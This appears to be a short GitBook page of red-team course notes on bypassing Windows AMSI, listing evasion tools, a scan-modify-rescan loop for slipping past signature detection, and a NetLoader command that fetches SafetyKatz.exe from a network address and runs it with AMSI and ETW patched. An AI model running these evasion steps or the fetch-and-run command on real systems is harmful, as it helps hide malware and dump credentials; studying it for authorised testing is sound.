---
cover: ../.gitbook/assets/CRTP (1).png
coverY: 0
layout:
  cover:
    visible: true
    size: hero
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# 🔥 AMSI Bypass

### Bypass Defences On-Memory

### Bypass Defences On-Disk

[AMSITrigger](https://github.com/RythmStick/AMSITrigger)

{% code overflow="wrap" %}
```powershell
AmsiTrigger_x64.exe -i C: AD Tools Invoke PowerShellTcp_Detected.ps1 DefenderCheck.exe PowerUp.ps1
```
{% endcode %}

[DefenderCheck](https://github.com/t3hbb/DefenderCheck)

[Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)

Steps to avoid signature-based detection are pretty simple:&#x20;

1\) Scan using AMSITrigger&#x20;

2\) Modify the detected code snippet&#x20;

3\) Rescan using AMSITrigger&#x20;

4\) Repeat steps 2 & 3 till we get a result as “AMSI\_RESULT\_NOT\_DETECTED” or “BLANK"

### Payload Delivery

{% embed url="https://github.com/Flangvik/NetLoader" %}

It can be used to load binary from file path or URL and patch AMSI & ETW while executing.

```
C:\Users\Public\Loader.exe -path http://192.168.100.X/SafetyKatz.exe
```
